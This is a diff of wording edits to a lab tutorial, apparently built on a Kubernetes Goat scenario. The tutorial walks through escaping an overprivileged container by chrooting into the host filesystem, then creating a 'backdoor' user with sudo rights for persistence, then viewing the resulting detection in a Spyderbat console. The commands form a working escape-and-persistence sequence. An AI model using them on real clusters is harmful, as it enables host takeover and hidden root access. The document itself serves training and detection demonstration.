@@ -4,7 +4,7 @@
 
 > This exploit is based on <a href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers/welcome" target="_blank">a Kubernetes Goat scenario</a>, updated to be compatible with modern Kubernetes.
 
-One of the assets we have added to the cluster is a system monitor that has more permissions than is really necessary. To start, use `kubectl exec` to access the container.
+One of the assets we have added to the cluster is a system monitor that has more permissions than is necessary. To start, use `kubectl exec` to access the container.
 
 ```sh
 kubectl exec -it -n chroot $(kubectl get pods -n chroot -o jsonpath='{.items[0].metadata.name}') -- /bin/bash
@@ -40,7 +40,7 @@ capsh --print | grep chroot
 chroot /host-system bash
 ```
 
-Now, we are in the root of the host system, which gives us all kinds of access. For this exercise, let's take a look at the running pods and containers with `crictl`, then create persistence with a new user.
+Now, we are in the root directory of the host system, which gives us all kinds of access. For this exercise, let's investigate the running pods and containers with `crictl`, then create persistence with a new user.
 
 `crictl` is an alternative command-line control to docker that integrates with Kubernetes. To start, let's use it to list the available pods:
 
@@ -72,7 +72,7 @@ a7e18aca478f0       5d7f6e3db4150       About an hour ago   Running             
 2a6b72c464d75       e3197d6b0c4c7       About an hour ago   Running             falcosidekick              3                   6d3463aca3379       falco-falcosidekick-6f7996c855-s48w6
 ```
 
-At this point, we could exec into one of these containers and investigate logs or API keys, but for now, let's move on to creating persistence. To do this, we will create a new user:
+At this point, we could `exec` into one of these containers and investigate logs or API keys, but for now, let's move on to creating persistence. To do this, we will create a new user:
 
 ```sh
 adduser backdoor
@@ -84,7 +84,7 @@ Retype password: hackme
 passwd: password for backdoor changed by root
 ```
 
-Next, we need to give the backdoor user permissions to use `sudo` so that they can get root access:
+Next, we need to give the backdoor user permission to use `sudo` so that they can get root access:
 
 ```sh
 visudo
@@ -112,12 +112,12 @@ User backdoor may run the following commands on system-monitor-deployment-5d49dd
 
 From here, we could then install ssh keys for the backdoor user.
 
-In summary, we gained access to a vulnerable Kubernetes container, then exploited its excessive access to gain root privileges on the host machine. From there, we were able to access the entire Kubernetes cluster on this node and create a backdoor user with root access for persistence.
+In summary, we gained access to a vulnerable Kubernetes container and exploited its excessive access to gain root privileges on the host machine. From there, we had access to the entire Kubernetes cluster on this node and created a backdoor user with root access for persistence.
 
 
 ## Investigating the Results
 
-Performing this exploit will trigger a number of red flags which are detected and collected into a single Spydertrace object. In the Spyderbat Console, navigate to the Dashboard page. In the Security tab, under "Recent Spydertraces with Score > 50", a new trace should appear, likely named "root_shell", or "container_escape_using_chroot...". Expanding the group name should show that it has an extremely high score of over 200, indicating a large number of linked high-severity flags. Selecting this Spydertrace, we can select "Start Process Investigation" to see the events of the exploit layed out in a Causal Tree in the investigation view:
+Performing this exploit will trigger several red flags which are detected and collected into a single Spydertrace object. In the Spyderbat Console, navigate to the Dashboard page. In the Security tab, under "Recent Spydertraces with Score > 50", a new trace should appear, likely named "root_shell", or "container_escape_using_chroot...". Expanding the group name should show that it has an extremely high score of over 200, indicating a large number of linked high-severity flags. Selecting this Spydertrace, we can select "Start Process Investigation" to see the events of the exploit laid out in a Causal Tree in the investigation view:
 
 ![A section of the Spydertrace featuring one of my chroot commands](./chroot_flag_graph.png)
 
